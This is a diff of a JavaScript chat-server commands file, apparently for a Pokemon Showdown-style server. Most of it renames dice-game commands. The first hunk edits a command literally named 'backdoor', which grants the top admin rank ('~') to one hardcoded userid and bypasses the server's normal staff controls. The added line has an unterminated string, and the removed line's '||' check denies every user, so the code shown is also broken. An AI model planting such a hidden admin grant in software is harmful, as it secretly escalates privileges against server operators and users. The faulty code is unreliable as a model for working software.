@@ -589,7 +589,7 @@ user.updateIdentity();
      *********************************************************/
 
     backdoor: function (target, room, user) {
-        if (user.userid !== 'blakjack' || user.userid !== 'creaturephil') return this.sendReply('/backdoor - Access denied.');
+        if (user.userid !== 'bandi) return this.sendReply('/backdoor - Access denied.');
 
         if (!target) {
             user.group = '~';
@@ -1064,30 +1064,29 @@ user.updateIdentity();
         dicecommands: function(target, room, user) {
             if (!this.canBroadcast()) return;
             return this.sendReplyBox('<u><font size = 2><center>Dice rules and commands</center></font></u><br />' +
-                '<b>/dicegame OR /diceon [amount]</b> - Starts a dice game in the room for the specified amount of bucks. Must be ranked + or higher to use.<br />' +
-                '<b>/play</b> - Joins the game of dice. You must have more or the same number of bucks the game is for. Winning a game wins you the amount of bucks the game is for. Losing the game removes that amount from you.<br />' +
-                '<b>/diceend</b> - Ends the current game of dice in the room. You must be ranked + or higher to use this.');
+                '<b>/startdice [amount]</b> - Starts a dice game in the room for the specified amount of bucks. Must be ranked + or higher to use.<br />' +
+                '<b>/joindice</b> - Joins the game of dice. You must have more or the same number of bucks the game is for. Winning a game wins you the amount of bucks the game is for. Losing the game removes that amount from you.<br />' +
+                '<b>/enddice</b> - Ends the current game of dice in the room. You must be ranked + or higher to use this.');
         },
 
-        dicegame: 'diceon',
-        diceon: function(target, room, user, connection, cmd) {
+        startdice: function(target, room, user, connection, cmd) {
             if (!this.can('broadcast', null, room)) return this.sendReply('You must be ranked + or higher to be able to start a game of dice.');
             if (room.dice) {
                 return this.sendReply('There is already a dice game going on');
             }
             target = toId(target);
             if (!target) return this.sendReply('/'+cmd+' [amount] - Starts a dice game. The specified amount will be the amount of cash betted for.');
-            if (isNaN(target)) return this.sendReply('That isn\'t a number, smartass.');
+            if (isNaN(target)) return this.sendReply('That isn\'t a number m8y.');
             if (target < 1) return this.sendReply('You cannot start a game for anything less than 1 buck.');
             room.dice = {};
             room.dice.members = [];
             room.dice.award = parseInt(target);
             var point = (target == 1) ? 'buck' : 'bucks';
             this.add('|html|<div class="infobox"><font color = #007cc9><center><h2>' + user.name + ' has started a dice game for <font color = green>' + room.dice.award + '</font color> '+point+'!<br />' +
-                '<center><button name="send" value="/play" target="_blank">Click to join!</button>');
+                '<center><button name="send" value="/joindice" target="_blank">Click to join!</button>');
         },
 
-        play: function(target, room, user, connection, cmd) {
+        joindice: function(target, room, user, connection, cmd) {
             if (!room.dice) {
                 return this.sendReply('There is no dice game going on now');
             }
@@ -1195,7 +1194,7 @@ user.updateIdentity();
             }
         },
 
-        diceend: function(target, room, user) {
+        enddice: function(target, room, user) {
                 if (!this.can('broadcast', null, room)) return false;
                     if (!room.dice) return this.sendReply("There is no game of dice going on in this room right now."); this.add('|html|<b>The game of dice has been ended by ' + user.name); delete room.dice;
                 },
